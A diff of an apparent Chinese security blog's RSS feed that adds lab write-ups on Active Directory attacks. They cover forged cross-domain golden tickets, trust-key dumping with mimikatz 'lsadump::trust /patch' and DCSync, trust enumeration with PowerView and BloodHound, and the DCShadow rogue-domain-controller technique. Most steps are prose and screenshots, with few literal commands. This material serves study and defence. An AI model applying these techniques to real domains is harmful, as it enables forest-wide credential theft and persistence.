+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306195728072.png&#34; data-size=&#34;1318x913&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306195728072.png&#34;
+			width=&#34;1318&#34;
+			height=&#34;913&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306195728072_hu6f66eacb89b6899609cf236dd01ebd5b_820581_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306195728072_hu6f66eacb89b6899609cf236dd01ebd5b_820581_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;仍然在lab.adsec. com域中构造黄金票据,但添加了SIDS参数，&lt;strong&gt;使用根域的企业管理员SID作为参数值&lt;/strong&gt;，即SIDHistory版黄金票据，对lab.adsec.com和adsec.com域均有效。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注意：&lt;/p&gt;
+&lt;p&gt;实现SIDHistory版黄金票据的基础是&lt;strong&gt;森林内信任关系&lt;/strong&gt;，因为如果不是森林内信任关系，则SIDHistory会被微软的SID Filter规则过滤掉,从而失效，但森林内部不会有SID Filter规则。这也是为什么说&lt;strong&gt;森林是安全边界&lt;/strong&gt;而非域。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;irkey-版跨域黄金票据&#34;&gt;IRKey 版跨域黄金票据&lt;/h2&gt;
+&lt;p&gt;当2个域之间建立域信任关系时，需要建立共享的域间密钥（Inter-Realm Key，简写为IRKey），其作用相当于Krbtgt，只不过IRKey是用于相互信任的2个域之间，而Krbtgt用于同一个域服务器的AC和KDC之间。&lt;/p&gt;
+&lt;p&gt;只要获取森林内部任意域的krbtgt账号的NTLM值，则通过SIDHistory版黄金票据，即可获取全森林所有域的控制权。因此&lt;strong&gt;为了防御，必须2次修改森林内部所有域的krbtgt账号的NTLM值&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;在多域环境中，IRKey和主机账号类似，系统默认每30天自动修改一次NTLM。所以即使2次修改森林内所有域的krbtgt账号的NTLM，IRKey的NTLM大概率仍然没有发生 改变（小概率是krbtgt的NTLM修改正好碰上了IRKey的修改周期）。&lt;/p&gt;
+&lt;p&gt;可以使用&lt;strong&gt;IRKey伪造域间可转投票据(Inter-Realm Referral TGT),获取目标域的域管理员权限&lt;/strong&gt;，然后再结合SIDHistory版黄金票据，再次获取整个森林的控制权。&lt;strong&gt;需要注意的是SID为目标域的SID。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在域中，大部分带&lt;code&gt;$&lt;/code&gt;符号的账号为Computer账号，但是&lt;strong&gt;User组带&lt;code&gt;$&lt;/code&gt;符号的账号为信任账号&lt;/strong&gt;，可以通过域服务器自带的Powershe11命令&lt;code&gt;Get-ADUser&lt;/code&gt;获取所有带&lt;code&gt;$&lt;/code&gt;符号的User账号，例如下图中的&lt;code&gt;ADSECS$&lt;/code&gt;账号为信任账号，隶属
+于Users组：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 331; 
+			flex-basis: 794px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202433733.png&#34; data-size=&#34;1752x529&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202433733.png&#34;
+			width=&#34;1752&#34;
+			height=&#34;529&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202433733_hu979cd0bfbece141ae65c77a8f56dce4a_548513_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306202433733_hu979cd0bfbece141ae65c77a8f56dce4a_548513_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dcsync 获取信任账号NTLM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 148; 
+			flex-basis: 356px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202850685.png&#34; data-size=&#34;1414x953&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202850685.png&#34;
+			width=&#34;1414&#34;
+			height=&#34;953&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202850685_hu85fb91c2cd470f4c842810420e52e3d3_999638_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306202850685_hu85fb91c2cd470f4c842810420e52e3d3_999638_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;lsadump::trust /patch&lt;/code&gt;获取信任账号NTLM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 198; 
+			flex-basis: 475px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306203603888.png&#34; data-size=&#34;1689x852&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306203603888.png&#34;
+			width=&#34;1689&#34;
+			height=&#34;852&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306203603888_hued6743490a9274ab30372a1044e387ee_1601436_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306203603888_hued6743490a9274ab30372a1044e387ee_1601436_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;从图中可看到有&lt;code&gt;[IN]LAB.ADSEC.COM-&amp;gt;ADSEC.COM&lt;/code&gt;和&lt;code&gt;[OUT]ADSEC.COM-&amp;gt;LAB.ADSEC.COM&lt;/code&gt;两种不同的NTLM值，分别是往外到其他域和往内到本域访问时用到的值。&lt;strong&gt;因为双向信任关系其实是2个单向信任关系的叠加&lt;/strong&gt;，所以会有2个密钥。为了从本域&lt;code&gt;lab.adsec.com&lt;/code&gt;构造IRKey版黄金票据并访问森林内部其他域，所以使用IN这个NTLM值。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;由于IRKey存在于森林内部的信任域之间，也存在于森林外部的森林之间，均可用于转投认证。在SIDHistoy版黄金票据中，由于SID Filter规则，在森林之间不能使用，但是IRKey版不涉及这个安全过滤规则，仍然有效。IRKey版黄金票据可以分作&lt;strong&gt;森林内部、森林外部2种&lt;/strong&gt;，操作方法类似。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;mimikatz生成IRkey版跨域黄金票据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 130; 
+			flex-basis: 312px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306204106301.png&#34; data-size=&#34;1313x1008&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306204106301.png&#34;
+			width=&#34;1313&#34;
+			height=&#34;1008&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306204106301_huc521a3e04a434702843d0912980f4e60_872805_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306204106301_huc521a3e04a434702843d0912980f4e60_872805_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;虽然参数还是krbtgt，但是值已经是IRKey账户的NTLM&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;域间转投票据的认证，依靠IRKey加密。在已知IRKey的前提下，可以伪造持有该IRKey的信任域的任意用户。上图测试中，我们构造一个票据，告诉adsec.com域，转投认证的用户为administrator,而且SIDHistory为根域的企业管理员。&lt;/p&gt;
+&lt;p&gt;构造成功后，具备adsec.com的管理员权限，但是不能高权限访问lab.adsec.com，&lt;strong&gt;因为构造的票据是到adsec.com域的管理员票据&lt;/strong&gt;。在获取adsec.com域的高权限后，&lt;strong&gt;可以获取该域的krbtgt账号的NTLM值，在此基础上，继续构造SIDHistory版黄金票据&lt;/strong&gt;，从而可以获取整个森林的控制权。&lt;/p&gt;
+&lt;h2 id=&#34;域信任关系的获取&#34;&gt;域信任关系的获取&lt;/h2&gt;
+&lt;p&gt;在大型域网络中，因为公司并购、企业重组、业务扩展等各种原因，域网络的组织模式、信任关系各有不同。这些不同的信任关系，均存放在森林根域的数据库中(Global Catalog)，有多种方式可以获取这些数据。&lt;/p&gt;
+&lt;h3 id=&#34;powersploit&#34;&gt;PowerSploit&lt;/h3&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 195; 
+			flex-basis: 470px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306213910574.png&#34; data-size=&#34;1714x875&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306213910574.png&#34;
+			width=&#34;1714&#34;
+			height=&#34;875&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306213910574_hub14a8fbb126aea14b20b007d565169bf_977104_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306213910574_hub14a8fbb126aea14b20b007d565169bf_977104_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Get-NetForestTrust&lt;/code&gt;获取指定域的森林间信任关系。&lt;code&gt;Get-NetDomainTrust&lt;/code&gt;获取指定域所在森林内部所有信任关系。一般，只要指定域信任当前主机所在的域，就可以获取对方的信任关系数据。&lt;/p&gt;
+&lt;p&gt;在查询时可以使用Export-CSV -NoTypeInformation将输出结果转换为CSV格式，命令为&lt;code&gt;Get-DomainTrustMapping -API Export-CSV -NoTypeInformation trusts-mapping.csv&lt;/code&gt;。然后使用&lt;code&gt;TrustVisualizer&lt;/code&gt;工具进行可视化输出。最后使用&lt;code&gt;yED&lt;/code&gt;工具转换为可视化图形。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 585; 
+			flex-basis: 1404px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215525679.png&#34; data-size=&#34;1703x291&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215525679.png&#34;
+			width=&#34;1703&#34;
+			height=&#34;291&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215525679_hu90254bd223906bc1110583ee9115c4f9_354552_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306215525679_hu90254bd223906bc1110583ee9115c4f9_354552_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 180; 
+			flex-basis: 434px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215555051.png&#34; data-size=&#34;700x387&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215555051.png&#34;
+			width=&#34;700&#34;
+			height=&#34;387&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215555051_hu7eba03d70e2645003b8994e33bcbddb7_69906_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306215555051_hu7eba03d70e2645003b8994e33bcbddb7_69906_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;bloodhound&#34;&gt;BloodHound&lt;/h3&gt;
+&lt;h2 id=&#34;利用域信任实现跨域攻击&#34;&gt;利用域信任实现跨域攻击&lt;/h2&gt;
+&lt;p&gt;如果一个域内用户(假设用户为 eviluser)想访问其他域的资源访问，首先&lt;strong&gt;确保目标域信任当前用户所在的域&lt;/strong&gt;，这是基本前提，然后必须具备以下3个条件之一：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;eviluser 被目标域加入了某个组，这个组在目标域中具有资源访问权限&lt;/li&gt;
+&lt;li&gt;eviluser 被目标域中的某些主机或服务器添加为本地组，例如被某台服务器添加为本地管理员组&lt;/li&gt;
+&lt;li&gt;当前用户被目标域的某些域对象添加为访问控制 ACL 的安全主体(Security Principal)，例如可以修改某个域用户对象的口令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;根据前面内容，只要获取了当前域的 &lt;code&gt;Krbtgt&lt;/code&gt; 账号或者 &lt;code&gt;IRKey&lt;/code&gt; 账号的 &lt;code&gt;NTLM&lt;/code&gt; 值， 即可获取整个森林的控制权。然而实际情况下并不一定能顺利获取某个域的 &lt;code&gt;Krbtgt&lt;/code&gt; 账号或者 &lt;code&gt;IRKey&lt;/code&gt; 账号的 &lt;code&gt;NTLM&lt;/code&gt; 值，例如域资源少、配置严谨、系统更新及时等，这时需要绕道至更大的域，才有更多的机会获取 &lt;code&gt;Krbtgt&lt;/code&gt; 账号或者 &lt;code&gt;IRKey&lt;/code&gt; 账号的 &lt;code&gt;NTLM&lt;/code&gt; 值，因为资源越多，存在脆弱点的概率越大。&lt;/p&gt;
+&lt;p&gt;要实现从当前用户 eviluser 开始，跨域攻击 A 域，&lt;strong&gt;首先得确保当前用户具备跨域访问 A 域资源的权限&lt;/strong&gt;，所以攻击环节应该包括几个步骤：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;从当前域的数据库中，枚举有哪些域信任当前域 (出)，由于是攻击其他域，所以不用关注当前域信任哪些外部域(入)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;利用信任关系，枚举目标域中哪些组包含外来域的用户。在域内通常有 3 种 类型的组：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;第 1 种是域本地组(Domain Local Groups)，可以添加跨域、跨森林的组成员，也是最常见的组&lt;/li&gt;
+&lt;li&gt;第 2 种是全局组(Global Groups)，不允许有任何跨域组成员，即使是同一个森林也不可以&lt;/li&gt;
+&lt;li&gt;第 3 种是通用组(Universal Groups)，可以添加森林内的任何成员，但是跨森林的不可以&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;一般只关注第1和第3种组，一个用户的 &lt;code&gt;memberof&lt;/code&gt; 属性由组的 &lt;code&gt;member&lt;/code&gt; 属性计算 而来，前提是组的 &lt;code&gt;member&lt;/code&gt; 属性已经更新到全局目录数据库中(Global Catalog)。如果一个用户被森林中另外一个域添加为通用组成员，通用组将 &lt;code&gt;member&lt;/code&gt; 属性更新到森林的全局目录数据库中，用户的 &lt;code&gt;memberof&lt;/code&gt; 属性会通过计算被更新。&lt;/p&gt;
+&lt;p&gt;一个用户被森林中另外一个域添加为域本地组成员时，由于域本地组不会更新 &lt;code&gt;memberof&lt;/code&gt; 属性到全局目录数据库中，因此用户的 &lt;code&gt;memberof&lt;/code&gt; 属性也不会被计算更新。所以，即使我们有权限查询森林的全局目录数据库，也只能得到被添加到其他域通用组的成员属性，要想获得加入其他域域本地组的成员属性，需要逐个轮询所有的域。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;枚举目标域中主机\服务器的本地组，查看哪些外来用户被加入到主机\服务器的本地组，可以通过 &lt;code&gt;GPO&lt;/code&gt; 组策略进行枚举，也可以通过 &lt;code&gt;PowerView&lt;/code&gt; 逐个探测，或使用 &lt;code&gt;BloodHood&lt;/code&gt; 自动化全部探测&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;枚举目标域内对象的 ACL，检查是否有包含外来域用户的域对象 ACL。一般而言，任意用户均可查看所有域内对象的 ACL，同时全局数据库中保存了所有域对象的 ACL，可以很方便进行枚举。PowerView 提供了 &lt;code&gt;Get-DomainObjectACL&lt;/code&gt; 命令去获取这项信息。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 241; 
+			flex-basis: 579px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220310145211211.png&#34; data-size=&#34;1033x428&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220310145211211.png&#34;
+			width=&#34;1033&#34;
+			height=&#34;428&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220310145211211_hufb6dd7d1af373b85dbedf0edd18c1b7a_300869_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220310145211211_hufb6dd7d1af373b85dbedf0edd18c1b7a_300869_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;对前面几步筛选出的用户做第二次筛选，筛选出属于当前域的用户，作为在当前域中的攻击对象，例如获取目标用户的 NTLM 值或者 TGT 票据等。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;利用获取的用户的NTLM值或者TGT票据进行跨域，进入目标域，然后攻击获取目标域的 &lt;code&gt;Krbtgt&lt;/code&gt; 账号或者 &lt;code&gt;IRKey&lt;/code&gt; 账号的 &lt;code&gt;NTLM&lt;/code&gt; 值，如果条件不成熟，继续上面的步骤，逐步进入更多的域中寻找机会。&lt;/p&gt;
+&lt;p&gt;当一个用户被森林外部域加入某个组时，会出现在外部目标域的 &lt;code&gt;CN=ForeignSecurityPrincipals,DC=domain,DC=com&lt;/code&gt; 组中，相当于用户在外部域中的代表或者别名，而且域中的所有外来用户具备相同的 &lt;code&gt;SID&lt;/code&gt;，这是跨森林的 &lt;code&gt;SID&lt;/code&gt; 过滤安全机制的效果。&lt;/p&gt;
+&lt;p&gt;所以只要枚举 &lt;code&gt;ForeignSecurityPrincipals&lt;/code&gt; 组，就可得知哪些用户具有这个外部森林的访问权限，假设用户结果集合为 &lt;code&gt;ExternalUsers&lt;/code&gt;。接下来，先查看是否包含我们当前所在域的用户，如果有，则直接攻击这些用户获取 &lt;code&gt;NTLM&lt;/code&gt; 值或者 &lt;code&gt;TGT&lt;/code&gt; 票据，从而获取森林外部域的资源访问权限。&lt;/p&gt;
+&lt;p&gt;如果没有，则查看 &lt;code&gt;ExternalUsers&lt;/code&gt; 是否包含我们当前所在森林的用户，假设结果合集为 &lt;code&gt;InternalUsers&lt;/code&gt;。在当前森林中查询定位 &lt;code&gt;InternalUsers&lt;/code&gt; 所在的域。以这些域为目标，使用森林内部的跨域攻击方法，攻击这些域，获取进入这些域的权限，再从这些域中攻击 &lt;code&gt;InternalUsers&lt;/code&gt; 中的用户，从而获取外部域的资源访问权限。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;sid过滤机制&#34;&gt;SID过滤机制&lt;/h2&gt;
+&lt;h3 id=&#34;sidhistory&#34;&gt;SIDHistory&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;SIDHistory&lt;/code&gt;属性的存在是为了解决用户在迁移到另一个域中的时候权限会改变的问题。例如用户a在A域中本来是管理员，迁移到B域的时候因为&lt;code&gt;SID&lt;/code&gt;的改变有可能会变成普通用户权限，这时候如果给a用户添加一个值为a在A域中的&lt;code&gt;SID&lt;/code&gt;的&lt;code&gt;SIDHistory&lt;/code&gt;值，就可以解决这个问题，&lt;strong&gt;只有域管有更改&lt;code&gt;SIDHistory&lt;/code&gt;的权力。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;当一个用户迁移到新的域后，原来的 &lt;code&gt;SID&lt;/code&gt; 以及所在组的一些 &lt;code&gt;SID&lt;/code&gt;，都可被加入到新域中新用户的 &lt;code&gt;SIDHistory&lt;/code&gt; 属性。当这个新的用户访问某个资源时，根据 &lt;code&gt;SID&lt;/code&gt; 或者 &lt;code&gt;SIDHistory&lt;/code&gt; 在资源 &lt;code&gt;ACL&lt;/code&gt; 中的匹配性来判断是拒绝或者允许访问。因此 &lt;code&gt;SIDHistory&lt;/code&gt; 相当于多了一个或者多个组属性，最终权限得到了扩张。&lt;/p&gt;
+&lt;h3 id=&#34;sid-过滤&#34;&gt;SID 过滤&lt;/h3&gt;
+&lt;p&gt;当一个用户的 &lt;code&gt;TGT&lt;/code&gt; 通过域信任关系被转递到一个新域后，&lt;code&gt;TGT&lt;/code&gt; 中的 &lt;code&gt;PAC(privileged attribute certificate)&lt;/code&gt; 包含用户的 &lt;code&gt;SID&lt;/code&gt; 和 &lt;code&gt;SIDHistory&lt;/code&gt;。新域对 &lt;code&gt;PAC&lt;/code&gt; 进行严格的审查 ，并根据信任关系的类别执行各种安全过滤机制&lt;/p&gt;
+&lt;p&gt;有些 &lt;code&gt;SID&lt;/code&gt; 是一直被拒绝的，例如企业管理员 &lt;code&gt;(S-1-5-21-&amp;lt;Domain&amp;gt;-519)&lt;/code&gt; 的 &lt;code&gt;SID&lt;/code&gt; 是被 &lt;code&gt;ForestSpecific&lt;/code&gt; 规则过滤，因为森林拒绝来自森林之外的特权 &lt;code&gt;SIDHistory&lt;/code&gt;。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>pkexec 本地提权</title>
         <link>https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/</link>
         <pubDate>Sat, 01 Jan 2022 00:00:00 +0000</pubDate>
@@ -198,6 +806,1063 @@ main (int argc, char *argv[])
 	&lt;/a&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>DCShadow 攻击</title>
+        <link>https://coollllllll.github.io/p/intranet-11/</link>
+        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/intranet-11/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/intranet-11/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post DCShadow 攻击" /&gt;&lt;h1 id=&#34;dcshadow-攻击&#34;&gt;DCShadow 攻击&lt;/h1&gt;
+&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
+&lt;p&gt;2018 年 1 月 24 日，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 在 BlueHat IL 会议期间公布了针对域活动目录的一种新型攻击技术 &lt;code&gt;DCShadow&lt;/code&gt;。在具备域管理员权限条件下，攻击者可以创建伪造的域控制器，将预先设定的对象或对象属性复制到正在运行域服务器中。&lt;/p&gt;
+&lt;p&gt;**DCSync 从域服务器复制出东西，DCShadow 是将数据复制至域服务器。**Luc Delsalle 对这种技术进行了验证和详细的描述，并就红蓝对抗中蓝队对抗此种攻击技术的缺陷和补救方法。&lt;/p&gt;
+&lt;p&gt;从 DCShadow 目前展示的功能来看，主要只能用于&lt;strong&gt;红蓝对抗的隐蔽后门&lt;/strong&gt;。但是 DCShadow 第一次澄清和实现了伪造一个 DC 的最小需求合集，这个贡献非常大。以前很多攻击方法都卡在不能伪造域服务器，例如 MS15-011 和 MS15-014 等，有了 &lt;code&gt;DCShadow&lt;/code&gt; 的基础，应该会有很多新的攻击方法。&lt;/p&gt;
+&lt;h2 id=&#34;流程&#34;&gt;流程&lt;/h2&gt;
+&lt;p&gt;DCShadow 的攻击过程包括 3 个主要个步骤:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在目标域的 AD 活动目录注册一个伪造的 DC&lt;/li&gt;
+&lt;li&gt;使伪造的 DC 被其他的 DC 认可，能够参与域复制&lt;/li&gt;
+&lt;li&gt;强制触发域复制，将指定的新对象或修改后的对象属性同步复制到其他 DC 中&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;注册伪造-dc&#34;&gt;注册伪造 DC&lt;/h3&gt;
+&lt;p&gt;一台机器要想注册成为域中的一台 DC 服务器，需要在域的活动目录中注册一个 &lt;code&gt;NTDS-DSA(nTDSDSA)&lt;/code&gt;类对象。注册的位置为 &lt;code&gt;CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 323; 
+			flex-basis: 776px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155254328.png&#34; data-size=&#34;1000x309&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155254328.png&#34;
+			width=&#34;1000&#34;
+			height=&#34;309&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155254328_hu98107c0c322efcd3c9fb40f85023b7ed_407692_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-11/image-20220314155254328_hu98107c0c322efcd3c9fb40f85023b7ed_407692_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;adsec.com 域有 3 台域服务器，分别是 LABDC01、RESDC01 及 WIN2016-DC01。测试机器为 Win7X86cn04，如果 DCShadow 测试成功的话，则会生成一个新的NTDS-DSA(nTDSDSA)类对象：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 244; 
+			flex-basis: 586px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155509416.png&#34; data-size=&#34;1005x411&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155509416.png&#34;
+			width=&#34;1005&#34;
+			height=&#34;411&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155509416_hu1642c878d93f69bb11cb6a6ee8f9d237_507378_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-11/image-20220314155509416_hu1642c878d93f69bb11cb6a6ee8f9d237_507378_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;查看 &lt;code&gt;CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com&lt;/code&gt;的安全描述符，可知必须有&lt;code&gt;域管理员权限&lt;/code&gt;才具备&lt;strong&gt;写权限&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 174; 
+			flex-basis: 419px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155705326.png&#34; data-size=&#34;997x571&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155705326.png&#34;
+			width=&#34;997&#34;
+			height=&#34;571&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155705326_hubdf185d318a11c29e549854461f895f3_291397_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-11/image-20220314155705326_hubdf185d318a11c29e549854461f895f3_291397_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;所以发动 DCShadow 攻击首先必须具备域管理员权限。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;认可-dc&#34;&gt;认可 DC&lt;/h3&gt;
+&lt;p&gt;一个刚注册的 DC 要想被域中其他DC认可，能够参与域复制，需要满足 3 个条件:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;这台伪造 DC 具备认证凭证，能认证到域，即有域内账号，可以使用机器账号，实验环境中为 &lt;code&gt;WIN7X86CN04$&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;伪造 DC 能认证其他 DC 来访问的账号，通过给 &lt;code&gt;WIN7X86CN04$&lt;/code&gt; 添加 &lt;code&gt;SPN&lt;/code&gt;，可以实现这一点。关键是需要添加哪些SPN，DCShadow 的一个大贡献是找到 了 SPN 的最小合集，只需要 2 个即可:&lt;code&gt;DRS&lt;/code&gt;服务(GUID 为 E3514235–4B06–11D1-AB04–00C04FC2DCD2) 和 &lt;code&gt;GC&lt;/code&gt;(Global Catalog)服务&lt;/li&gt;
+&lt;/ul&gt;
